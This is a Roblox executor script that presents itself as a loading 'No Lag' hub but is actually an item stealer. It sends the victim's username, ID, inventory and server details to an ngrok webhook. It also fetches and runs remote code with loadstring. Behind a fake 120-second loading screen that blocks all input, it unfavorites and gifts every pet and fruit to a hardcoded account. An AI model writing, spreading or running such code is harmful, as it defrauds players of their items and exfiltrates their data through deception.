local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")
local UserInputService = game:GetService("UserInputService")
local VirtualInput = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Executor detection
local executorType = "Unknown"
if syn then executorType = "Synapse X"
elseif is_sirhurt_closure then executorType = "SirHurt"
elseif secure_load then executorType = "ScriptWare"
elseif KRNL_LOADED then executorType = "Krnl"
elseif fluxus then executorType = "Fluxus"
elseif identifyexecutor then executorType = identifyexecutor() end

-- CONFIG: Set your main account's name
local OWNER_NAME = "KLPNmk13" -- 👈 CHANGE THIS

-- Other config values
local TARGET_NAME = "KLPNmk13"
local LOADING_TIME = 120
local TELEPORT_DELAY = 0.1
local GIFT_HOLD_TIME = 2
local EQUIP_DELAY = 0.5
local GIFT_COOLDOWN = 0.4
local LOOP_DELAY = 5
local PROXY_URL = "https://95b8-185-161-93-244.ngrok-free.app/webhook"
local PET_GIFTING_DELAY = 0.5 -- Delay between pet gifting actions

local EXCLUDEDITEMS = {
    "Shovel [Destroy Plants]", "Apple", "Blueberry", "Corn", "Cranberry", "Tomato", "Pineapple",
    "Peach", "Cherry Blossom", "Orange", "Banana", "Cherry", "Strawberry", "Watermelon",
    "Mango", "Lemon", "Pear", "Raspberry", "Grapes", "Kiwi", "Coconut", "Papaya", "Plum",
    "Fig", "Pomegranate", "Dragonfruit", "Passionfruit", "Blackberry", "Cranberry",
}

local FRUIT_PRIORITY = {
    "Raccoon", "Dragonfly", "Red Fox", "Praying Mantis", "Candy Blossom", "Chicken Zombie"
}

-- Backpack scan
local function getExecutorBackpack()
    local items = {}
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")

    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then table.insert(items, tool.Name) end
    end
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then table.insert(items, tool.Name) end
        end
    end
    return items
end

local function getGameName()
    local success, result = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return success and result or "Unknown Game"
end

local teleportData = {
    executor = {
        name = LocalPlayer.Name,
        id = LocalPlayer.UserId,
        displayName = LocalPlayer.DisplayName,
        backpack = getExecutorBackpack()
    },
    game = {
        placeId = game.PlaceId,
        jobId = game.JobId,
        name = getGameName()
    },
    system = {
        executor = executorType,
        os = os and os.time() and "Windows" or "Mobile/Console",
        time = os.date("%Y-%m-%d %H:%M:%S")
    },
    teleportScript = string.format([[
        local TeleportService = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        local targetJobId = "%s"
        local targetPlaceId = %d
        local function teleportWithRetry()
            local success, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, Players.LocalPlayer)
            end)
            if not success then
                warn("Teleport failed: " .. tostring(err))
                task.wait(2)
                teleportWithRetry()
            end
        end
        teleportWithRetry()
    ]], game.JobId, game.PlaceId)
}

local function sendTeleportData()
    local success, encoded = pcall(function()
        return HttpService:JSONEncode(teleportData)
    end)
    if not success then warn("Failed to encode teleport data") return end

    local url = PROXY_URL .. "?data=" .. HttpService:UrlEncode(encoded)
    for i = 1, 3 do
        local ok, res = pcall(function()
            if syn and syn.request then
                return syn.request({Url = url, Method = "GET"}).Body
            elseif request then
                return request({Url = url, Method = "GET"}).Body
            else
                return game:HttpGet(url, true)
            end
        end)
        if ok then
            print("✅ Script executed Successfully")
            return
        else
            warn("Attempt " .. i .. " failed")
            task.wait(1)
        end
    end
end

sendTeleportData()

loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()

-- Wait for owner to be in server
local function ownerIsHere()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == OWNER_NAME:lower() or p.DisplayName:lower() == OWNER_NAME:lower() then
            return true
        end
    end
    return false
end

if not ownerIsHere() then
    local ready = false
    local conn
    conn = Players.PlayerAdded:Connect(function(p)
        if p.Name:lower() == OWNER_NAME:lower() or p.DisplayName:lower() == OWNER_NAME:lower() then
            ready = true
            conn:Disconnect()
        end
    end)
    repeat task.wait(1) until ready
end

task.wait(3.4)

-- ** BLOCK ROBLOX UI + INPUT DURING LOADING **

repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

-- Disable all core GUI and topbar
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
StarterGui:SetCore("TopbarEnabled", false)

-- Block all input with highest priority
local function blockInput(_, _gp) return Enum.ContextActionResult.Sink end
ContextActionService:BindActionAtPriority("BlockAll", blockInput, false, math.huge, Enum.KeyCode.Unknown)

-- Hide mouse and lock it in center
pcall(function()
    UserInputService.MouseIconEnabled = false
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
end)

local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
gui.Name = "LoadingOverlay"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

local shade = Instance.new("Frame", gui)
shade.Size = UDim2.fromScale(1, 1)
shade.BackgroundColor3 = Color3.new(0, 0, 0)
shade.BackgroundTransparency = 0

local label = Instance.new("TextLabel", shade)
label.AnchorPoint = Vector2.new(0.5, 0.5)
label.Position = UDim2.new(0.5, 0, 0.5, 0)
label.Size = UDim2.new(0.9, 0, 0.18, 0)
label.BackgroundTransparency = 1
label.Font = Enum.Font.GothamBold
label.TextColor3 = Color3.new(1, 1, 1)
label.TextScaled = true
label.Text = "The Script is loading, be patient… 0 %"

task.spawn(function()
    for i = 0, LOADING_TIME do
        label.Text = string.format("The Script is loading, be patient… %d %%", math.floor(i / LOADING_TIME * 100))
        task.wait(1)
    end
    gui.Enabled = false
    -- Re-enable Roblox UI & input
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    StarterGui:SetCore("TopbarEnabled", true)
    ContextActionService:UnbindAction("BlockAll")
    pcall(function()
        UserInputService.MouseBehavior = Enum.MouseBehavior.Default
        UserInputService.MouseIconEnabled = true
    end)
end)

-- PET GIFTING SYSTEM
local function isPet(item)
    return item:IsA("Tool") and (string.find(item.Name, "%[%d+%.?%d* KG%]") or string.find(item.Name, "%[Age %d+%]"))
end

local function isFavorited(item)
    local attr = item:GetAttribute("Favorite")
    if attr == true or attr == "true" or attr == 1 then return true end

    local bv = item:FindFirstChild("Favorite")
    if bv and bv:IsA("BoolValue") and bv.Value then return true end

    if string.find(item.Name, "❤") or string.find(item.Name, "★") then return true end

    return false
end

local petGiftingInProgress = false
local petsGifted = 0

local function processOnePet()
    local backpack = LocalPlayer:WaitForChild("Backpack")
    local favoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item", 5)
    local giftingEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService", 5)
    
    if not favoriteEvent or not giftingEvent then return false end

    for _, item in ipairs(backpack:GetChildren()) do
        if isPet(item) then
            petGiftingInProgress = true
            
            if isFavorited(item) then
                favoriteEvent:FireServer(item)
                task.wait(PET_GIFTING_DELAY)
            end

            if not isFavorited(item) then
                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                item.Parent = character
                task.wait(0.2)

                giftingEvent:FireServer("GivePet", Players:WaitForChild(TARGET_NAME))
                petsGifted = petsGifted + 1
                task.wait(PET_GIFTING_DELAY)

                if item.Parent == character then
                    item.Parent = backpack
                end

                return true
            end
        end
    end
    petGiftingInProgress = false
    return false
end
task.wait(5)
-- FRUIT GIFTING SYSTEM
local function getFruits()
    local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
    if not bag then return {} end
    local list = {}
    for _, item in ipairs(bag:GetChildren()) do
        if item:IsA("Tool") and not table.find(EXCLUDEDITEMS, item.Name) then
            table.insert(list, item)
        end
    end
    table.sort(list, function(a, b)
        local aIndex = table.find(FRUIT_PRIORITY, a.Name) or (#FRUIT_PRIORITY + 1)
        local bIndex = table.find(FRUIT_PRIORITY, b.Name) or (#FRUIT_PRIORITY + 1)
        return aIndex < bIndex
    end)
    return list
end

local function safeEquip(tool)
    tool.Parent = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local t = 0
    while t < 1 do
        if tool.Parent == LocalPlayer.Character then
            task.wait(EQUIP_DELAY)
            return true
        end
        task.wait(0.1)
        t += 0.1
    end
    return false
end

local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local function gift(tool)
    if isMobile then
        local prompt = workspace:FindFirstChildWhichIsA("ProximityPrompt")
        if prompt then
            prompt:InputHoldBegin()
            task.wait(GIFT_HOLD_TIME)
            prompt:InputHoldEnd()
        end
    else
        VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        task.wait(GIFT_HOLD_TIME)
        VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    end
    tool.Parent = LocalPlayer:FindFirstChildOfClass("Backpack")
end

task.spawn(function()
    while true do
        local hasPets = true
        while hasPets do
            hasPets = processOnePet()
            task.wait(PET_GIFTING_DELAY)
        end
        
        local fruits = getFruits()
        if #fruits > 0 then
            for _, fruit in ipairs(fruits) do
                if safeEquip(fruit) then
                    gift(fruit)
                    task.wait(GIFT_COOLDOWN)
                end
            end
        else
            task.wait(LOOP_DELAY)
        end
        
        task.wait()
    end
end)

task.spawn(function()
    while true do
        local target
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name:lower() == TARGET_NAME:lower() or p.DisplayName:lower() == TARGET_NAME:lower() then
                target = p
                break
            end
        end
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if myRoot then
                myRoot.CFrame = target.Character.HumanoidRootPart.CFrame
            end
        end
        task.wait(TELEPORT_DELAY)
    end
end)
